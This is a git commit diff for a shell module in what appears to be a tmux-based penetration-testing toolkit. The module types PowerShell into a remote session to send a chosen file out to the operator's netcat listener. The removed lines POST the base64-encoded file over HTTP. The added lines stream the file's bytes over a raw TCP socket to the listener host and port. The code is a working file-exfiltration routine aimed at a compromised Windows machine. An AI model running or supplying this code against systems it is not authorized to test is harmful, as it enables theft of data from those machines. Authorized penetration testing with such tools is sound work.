a1489158cf9d45bc7764c6add683e97d77657f9d
Matthias Fulz <mfulz@olznet.de>
2023-11-16 22:39:27 +0100

    Features
    - Commander: New powershell transfer command via tcp socket

--- modules/auxiliary/misc/commander/commands/comm/files/powershell_fetch_socket.sh
+++ modules/auxiliary/misc/commander/commands/comm/files/powershell_fetch_socket.sh
@@ -4,7 +4,6 @@
 commander_run() {
   local pane_id="$1"
   local file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
-  local dst_file_b64="$(mktemp)"
   local dst_file="###SessionDir###Files/${file_to_fetch}"
   dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
   dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"
@@ -18,8 +17,14 @@ commander_run() {
   fi
 
   # listener_id="$(tmux new-window -P -d "nc -w 10 -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\"")"
-  tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\""
+  tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst_file\""
 
-  tmux send-keys "Invoke-WebRequest -uri http://$lhost:$lport/data.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"$file_to_fetch\")))" Enter
-  # tmux send-keys -t "$listener_id" "" Enter
+  tmux send-keys '[byte[]]$buffer = New-Object byte[] 1024' Enter
+  tmux send-keys "\$FileStream = [System.IO.File]::OpenRead(\"$file_to_fetch\")" Enter
+  tmux send-keys "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
+  tmux send-keys '$Stream = $TcpClient.GetStream()' Enter
+  tmux send-keys 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
+  tmux send-keys '$FileStream.Close()' Enter
+  tmux send-keys '$Stream.Dispose()' Enter
+  tmux send-keys '$TcpClient.Dispose()' Enter
 }
